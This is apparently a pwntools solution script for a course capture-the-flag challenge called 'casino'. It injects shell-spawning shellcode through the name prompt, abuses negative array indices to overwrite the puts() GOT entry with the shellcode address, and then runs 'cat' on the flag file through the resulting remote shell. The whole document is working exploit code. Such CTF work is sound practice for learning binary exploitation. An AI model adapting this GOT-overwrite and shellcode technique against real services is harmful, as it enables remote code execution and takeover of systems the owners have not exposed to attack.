from pwn import *
context(arch = 'amd64', os = 'linux')
r = remote('edu-ctf.csie.org', 10172)
#r = process('./casino')

name = b'A' *0x20 + asm(shellcraft.sh()) # code put at 0x602110
r.sendafter( "name: " , name )
r.sendlineafter( "age: " , '20' )

for i in range(6):
	r.sendlineafter(':', '1')
r.sendlineafter(']:', '1')
r.sendlineafter(']:', str(-0x2b))  # = (0x602020 - 0x6020d0)/4 + 1
r.sendlineafter(':', str(0x602110))

r.sendlineafter(':', '60')
r.sendlineafter(':', '42')
r.sendlineafter(':', '15')
r.sendlineafter(':', '0')
r.sendlineafter(':', '68')
r.sendlineafter(':', '54')
r.sendlineafter(']:', '1')	
r.sendlineafter(']:', str(-0x2a))
r.sendlineafter(':', str(0))

# pointer to puts() at 0x602020 (got.plt section)
r.sendline('cat /home/`whoami`/flag')
r.interactive()
